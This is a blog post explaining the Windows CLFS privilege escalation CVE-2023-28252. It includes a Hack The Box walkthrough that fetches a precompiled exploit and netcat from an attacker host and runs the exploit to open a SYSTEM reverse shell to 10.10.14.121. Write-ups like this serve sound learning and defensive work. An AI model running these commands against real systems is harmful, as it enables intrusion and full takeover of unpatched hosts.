+++
tags = ["Windows", "Active Directory", "CVE-2023-28252", "CLFS"]
draft = false
title = "Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability"
author = "bloodstiller"
date = 2024-11-05
+++

## Understanding CVE-2023-28252: A Deep Dive into CLFS Privilege Escalation {#understanding-cve-2023-28252-a-deep-dive-into-clfs-privilege-escalation}

CVE-2023-28252 represents a critical vulnerability in Microsoft's Common Log File System (CLFS) that allows local privilege escalation to SYSTEM.


### What is CLFS? {#what-is-clfs}

The Common Log File System (CLFS) is a logging subsystem introduced in Windows Server 2003 R2. Unlike traditional logging systems, CLFS provides:


#### Component Overview {#component-overview}

```text
CLFS Architecture:
├── Log Container
│   ├── Base Log File (.blf)
│   └── Container Files (.clf)
├── Stream Management
│   ├── Virtual Log Files
│   └── Log Blocks
└── Client Interface
    ├── User Mode API
    └── Kernel Mode API
```


#### Key Features {#key-features}

-   Transactional logging with ACID properties
-   High-performance sequential I/O operations
-   Crash recovery capabilities
-   Structured storage for log records


### Technical Deep Dive {#technical-deep-dive}


#### Vulnerability Details {#vulnerability-details}

The vulnerability exists in the CLFS driver (CLFS.SYS) and involves:

-   Memory allocation issues in the CLFS driver
-   Improper validation of user-controlled input
-   Potential for heap corruption leading to privilege escalation


### Real-World Exploitation Example {#real-world-exploitation-example}

-   This was performed on the hack the box machine Aero:
    -   <https://app.hackthebox.com/machines/Aero>


#### Available Proof of Concept {#available-proof-of-concept}

A pre-compiled exploit is available at:

-   <https://github.com/duck-sec/CVE-2023-28252-Compiled-exe>
-   **Note**: This exploit allows passing another binary as an argument for privileged execution


#### Initial Setup and Exploitation {#initial-setup-and-exploitation}

After discovering the target is vulnerable to CVE-2023-28252, we locate a suitable pre-compiled exploit:

-   <https://github.com/duck-sec/CVE-2023-28252-Compiled-exe>
-   **Note**: This exploit allows us to pass another binary as an argument, which is ideal for obtaining a reverse shell as NT/Authority

-   **Clone the Exploit**:
    ```bash
       git clone https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git
    ```

-   **Transfer Required Files to Target**:
    First, transfer the exploit:
    ```bash
       wget http://10.10.14.121:9000/exploit.exe -o ex.exe
    ```
    {{< figure src="/ox-hugo/2024-11-04-194403_.png" >}}

    Then, transfer netcat for the reverse shell:
    ```bash
       wget http://10.10.14.121:9000/nc64.exe -o nc64.exe
    ```
    {{< figure src="/ox-hugo/2024-11-04-194156_.png" >}}

-   **Setup Reverse Shell Listener**:
    On the attack machine:
    ```bash
       rlwrap -cAr nc -nvlp 443
    ```
    {{< figure src="/ox-hugo/2024-11-04-194636_.png" >}}

-   **Execute Exploit**:
    Trigger the exploit with netcat as the payload:
    ```bash
       .\ex.exe 1208 1 "C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 443 -e cmd"
    ```
    {{< figure src="/ox-hugo/2024-11-04-194705_.png" >}}

-   **Confirm Privilege Escalation**:
    Successfully receive NT/Authority SYSTEM shell:
    - ![](/ox-hugo/2024-11-04-194750_.png)


### Impact Analysis {#impact-analysis}


#### Affected Systems Matrix: {#affected-systems-matrix}

| Windows Version | Architecture | Vulnerable |
|-----------------|--------------|------------|
| Server 2022     | x64          | Yes        |
| Server 2019     | x64          | Yes        |
| Windows 11      | x64          | Yes        |
| Windows 10      | x64          | Yes        |


### Detection and Prevention: {#detection-and-prevention}


#### Mitigation Strategies: {#mitigation-strategies}

1.  **System Updates**:
    -   Apply latest Windows security updates
    -   Enable automatic updates

2.  **Access Controls**:
    -   Implement principle of least privilege
    -   Monitor and restrict access to CLFS-related operations

3.  **System Monitoring**:
    -   Monitor for suspicious CLFS operations
    -   Track privilege escalation attempts


### References: {#references}

1.  [Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252)
2.  [CVE-2023-28252 Details (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-28252)
3.  [Bleeping Computer Analysis](https://www.bleepingcomputer.com/news/security/windows-zero-day-vulnerability-exploited-in-ransomware-attacks/)
4.  [Duck-Sec's POC Repository](https://github.com/duck-sec/CVE-2023-28252-Compiled-exe)
5.  [Rapid7's](https://www.rapid7.com/blog/post/2023/04/11/patch-tuesday-april-2023/)
6.  [For a very deep dive Fortra.com](https://www.coresecurity.com/core-labs/articles/analysis-cve-2023-28252-clfs-vulnerability)
